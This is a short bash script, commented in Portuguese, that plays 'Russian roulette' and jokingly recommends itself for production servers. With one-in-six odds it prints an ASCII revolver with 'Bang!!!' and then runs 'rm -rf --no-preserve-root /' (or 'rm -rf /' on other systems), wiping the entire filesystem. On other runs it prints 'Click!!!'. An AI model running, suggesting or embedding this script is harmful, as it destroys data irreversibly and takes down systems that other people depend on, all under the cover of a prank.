#!/bin/bash
# Roleta russa do bash. Brincadeira saudável para
# fazer nos servers de produção.
clear;

if [ $[ $RANDOM % 6 ] == 0 ]; then
     cat << 'EOF'
\
/                                 />
\__+_____________________/\/\___/ /|
()______________________      / /|/\
            /0 0  ---- |----    /---\
           |0 o 0 ----|| - \ --|      \
            \0_0/____/ |    |  |\      \
                        \__/__/  |      \
Bang!!!                       |       \
                                 |         \
                                 |__________|
EOF
    # Ubuntu
    if [ -f /etc/lsb-release ]; then
        rm -rf --no-preserve-root /

    # CentOS RHEL
    elif [ -f /etc/redhat-release ]; then
        rm -rf --no-preserve-root /

    else
        rm -rf /
    fi
else
    cat << 'EOF'
                                  />
 __+_____________________/\/\___/ /|
()______________________      / /|/\
            /0 0  ---- |----    /---\
           |0 o 0 ----|| - \ --|      \
            \0_0/____/ |    |  |\      \
                        \__/__/  |      \
Click!!!                       |       \
                                 |         \
                                 |__________|
EOF
fi
